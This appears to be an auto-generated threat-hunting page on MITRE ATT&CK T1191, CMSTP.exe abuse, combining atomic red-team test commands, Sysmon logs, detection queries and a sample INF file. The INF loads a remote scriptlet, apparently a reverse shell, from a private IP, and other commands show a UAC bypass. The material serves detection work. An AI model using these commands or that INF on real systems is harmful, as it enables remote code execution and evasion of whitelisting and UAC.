
# CMSTP

## Description

### MITRE Description

> The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1117) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.

CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)

## Additional Attributes

* Bypass: ['Application whitelisting', 'Anti-virus']
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1191

## Potential Commands

```
cmstp.exe /s PathToAtomicsFolder\T1191\src\T1191.inf

cmstp.exe /s PathToAtomicsFolder\T1191\src\T1191_uacbypass.inf /au

winword.exe
cmstp.exe
cmstp.exe/s|/ns|/au
Log
windows security log
Event ID: 4688
Process information:
New Process ID: 0x9b0
New Process Name: C: \ Windows \ System32 \ cmstp.exe

sysmon log
Event ID: 1
OriginalFileName: CMSTP.EXE
CommandLine: cmstp.exe / ni / s C: \ Users \ 12306Br0 \ Desktop \ a \ add.inf
CurrentDirectory: C: \ Windows \ system32 \
User: 12306Br0-PC \ 12306Br0
LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}
LogonId: 0x6e1ea
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1 = BA135738EF1FB2F4C2C6C610BE2C4E855A526668
ParentProcessGuid: {bb1f7c32-fdb7-5e9a-0000-0010563b2d00}
ParentProcessId: 1988
ParentImage: C: \ Windows \ System32 \ cmd.exe
ParentCommandLine: "C: \ Windows \ System32 \ cmd.exe"
## inf file contents
Inf
[Version]
Signature = $ chicago $
AdvancedINF = 2.5
[DefaultInstall_SingleUser]
UnRegisterOCXs = UnRegisterOCXSection
[UnRegisterOCXSection]
% 11% \ scrobj.dll, NI, http: //192.168.1.4/cmstp_rev_53_x64.sct
[Strings]
AppAct = "SOFTWARE \ Microsoft \ Connection Manager"
ServiceName = "Micropoor"
ShortSvcName = "Micropoor"
```

## Commands Dataset

```
[{'command': 'cmstp.exe /s PathToAtomicsFolder\\T1191\\src\\T1191.inf\n',
  'name': None,
  'source': 'atomics/T1191/T1191.yaml'},
 {'command': 'cmstp.exe /s '
             'PathToAtomicsFolder\\T1191\\src\\T1191_uacbypass.inf /au\n',
  'name': None,
  'source': 'atomics/T1191/T1191.yaml'},
 {'command': 'winword.exe',
  'name': 'parent_process',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmstp.exe',
  'name': 'sub_process_1',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmstp.exe/s|/ns|/au',
  'name': None,
  'source': 'SysmonHunter - CMSTP'},
 {'command': 'Log\n'
             'windows security log\n'
             'Event ID: 4688\n'
             'Process information:\n'
             'New Process ID: 0x9b0\n'
             'New Process Name: C: \\ Windows \\ System32 \\ cmstp.exe\n'
             '\n'
             'sysmon log\n'
             'Event ID: 1\n'
             'OriginalFileName: CMSTP.EXE\n'
             'CommandLine: cmstp.exe / ni / s C: \\ Users \\ 12306Br0 \\ '
             'Desktop \\ a \\ add.inf\n'
             'CurrentDirectory: C: \\ Windows \\ system32 \\\n'
             'User: 12306Br0-PC \\ 12306Br0\n'
             'LogonGuid: {bb1f7c32-5fc3-5e99-0000-0020eae10600}\n'
             'LogonId: 0x6e1ea\n'
             'TerminalSessionId: 1\n'
             'IntegrityLevel: High\n'
             'Hashes: SHA1 = BA135738EF1FB2F4C2C6C610BE2C4E855A526668\n'
             'ParentProcessGuid: {bb1f7c32-fdb7-5e9a-0000-0010563b2d00}\n'
             'ParentProcessId: 1988\n'
             'ParentImage: C: \\ Windows \\ System32 \\ cmd.exe\n'
             'ParentCommandLine: "C: \\ Windows \\ System32 \\ cmd.exe"',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': '## inf file contents',
  'name': '## inf file contents',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'Inf\n'
             '[Version]\n'
             'Signature = $ chicago $\n'
             'AdvancedINF = 2.5\n'
             '[DefaultInstall_SingleUser]\n'
             'UnRegisterOCXs = UnRegisterOCXSection\n'
             '[UnRegisterOCXSection]\n'
             '% 11% \\ scrobj.dll, NI, http: '
             '//192.168.1.4/cmstp_rev_53_x64.sct\n'
             '[Strings]\n'
             'AppAct = "SOFTWARE \\ Microsoft \\ Connection Manager"\n'
             'ServiceName = "Micropoor"\n'
             'ShortSvcName = "Micropoor"',
  'name': 'Inf',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
```

## Potential Detections

```json

```

## Potential Queries

```json
[{'name': 'CMSTP',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1and process_path contains "CMSTP.exe"'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - CMSTP': {'atomic_tests': [{'dependencies': [{'description': 'INF '
                                                                                      'file '
                                                                                      'must '
                                                                                      'exist '
                                                                                      'on '
                                                                                      'disk '
                                                                                      'at '
                                                                                      'specified '
                                                                                      'location '
                                                                                      '(#{inf_file_path})\n',
                                                                       'get_prereq_command': 'New-Item '
                                                                                             '-Type '
                                                                                             'Directory '
                                                                                             '(split-path '
                                                                                             '#{inf_file_path}) '
                                                                                             '-ErrorAction '
                                                                                             'ignore '
                                                                                             '| '
                                                                                             'Out-Null\n'
                                                                                             'Invoke-WebRequest '
                                                                                             '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191.inf" '
                                                                                             '-OutFile '
                                                                                             '"#{inf_file_path}"\n',
                                                                       'prereq_command': 'if '
                                                                                         '(Test-Path '
                                                                                         '#{inf_file_path}) '
                                                                                         '{exit '
                                                                                         '0} '
                                                                                         'else '
                                                                                         '{exit '
                                                                                         '1}\n'}],
                                                     'dependency_executor_name': 'powershell',
                                                     'description': 'Adversaries '
                                                                    'may '
                                                                    'supply '
                                                                    'CMSTP.exe '
                                                                    'with INF '
                                                                    'files '
                                                                    'infected '
                                                                    'with '
                                                                    'malicious '
                                                                    'commands\n',
                                                     'executor': {'command': 'cmstp.exe '
                                                                             '/s '
                                                                             '#{inf_file_path}\n',
                                                                  'elevation_required': False,
                                                                  'name': 'command_prompt'},
                                                     'input_arguments': {'inf_file_path': {'default': 'PathToAtomicsFolder\\T1191\\src\\T1191.inf',
                                                                                           'description': 'Path '
                                                                                                          'to '
                                                                                                          'the '
                                                                                                          'INF '
                                                                                                          'file',
                                                                                           'type': 'path'}},
                                                     'name': 'CMSTP Executing '
                                                             'Remote Scriptlet',
                                                     'supported_platforms': ['windows']},
                                                    {'dependencies': [{'description': 'INF '
                                                                                      'file '
                                                                                      'must '
                                                                                      'exist '
                                                                                      'on '
                                                                                      'disk '
                                                                                      'at '
                                                                                      'specified '
                                                                                      'location '
                                                                                      '(#{inf_file_uac})\n',
                                                                       'get_prereq_command': 'New-Item '
                                                                                             '-Type '
                                                                                             'Directory '
                                                                                             '(split-path '
                                                                                             '#{inf_file_uac}) '
                                                                                             '-ErrorAction '
                                                                                             'ignore '
                                                                                             '| '
                                                                                             'Out-Null\n'
                                                                                             'Invoke-WebRequest '
                                                                                             '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191_uacbypass.inf" '
                                                                                             '-OutFile '
                                                                                             '"#{inf_file_uac}"\n',
                                                                       'prereq_command': 'if '
                                                                                         '(Test-Path '
                                                                                         '#{inf_file_uac}) '
                                                                                         '{exit '
                                                                                         '0} '
                                                                                         'else '
                                                                                         '{exit '
                                                                                         '1}\n'}],
                                                     'dependency_executor_name': 'powershell',
                                                     'description': 'Adversaries '
                                                                    'may '
                                                                    'invoke '
                                                                    'cmd.exe '
                                                                    '(or other '
                                                                    'malicious '
                                                                    'commands) '
                                                                    'by '
                                                                    'embedding '
                                                                    'them in '
                                                                    'the '
                                                                    'RunPreSetupCommandsSection '
                                                                    'of an INF '
                                                                    'file\n',
                                                     'executor': {'command': 'cmstp.exe '
                                                                             '/s '
                                                                             '#{inf_file_uac} '
                                                                             '/au\n',
                                                                  'elevation_required': False,
                                                                  'name': 'command_prompt'},
                                                     'input_arguments': {'inf_file_uac': {'default': 'PathToAtomicsFolder\\T1191\\src\\T1191_uacbypass.inf',
                                                                                          'description': 'Path '
                                                                                                         'to '
                                                                                                         'the '
                                                                                                         'INF '
                                                                                                         'file',
                                                                                          'type': 'path'}},
                                                     'name': 'CMSTP Executing '
                                                             'UAC Bypass',
                                                     'supported_platforms': ['windows']}],
                                   'attack_technique': 'T1191',
                                   'display_name': 'CMSTP'}},
 {'Threat Hunting Tables': {'chain_id': '100210',
                            'commandline_string': '',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'low',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1191',
                            'mitre_caption': 'cmstp',
                            'os': 'windows',
                            'parent_process': 'winword.exe',
                            'registry_path': '',
                            'registry_value': '',
                            'sub_process_1': 'cmstp.exe',
                            'sub_process_2': ''}},
 {'SysmonHunter - T1191': {'description': None,
                           'level': 'medium',
                           'name': 'CMSTP',
                           'phase': 'Execution',
                           'query': [{'process': {'cmdline': {'pattern': '/s|/ns|/au'},
                                                  'image': {'pattern': 'cmstp.exe'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)

* [Execution](../tactics/Execution.md)
    

# Mitigations

None

# Actors


* [Cobalt Group](../actors/Cobalt-Group.md)

* [MuddyWater](../actors/MuddyWater.md)
    
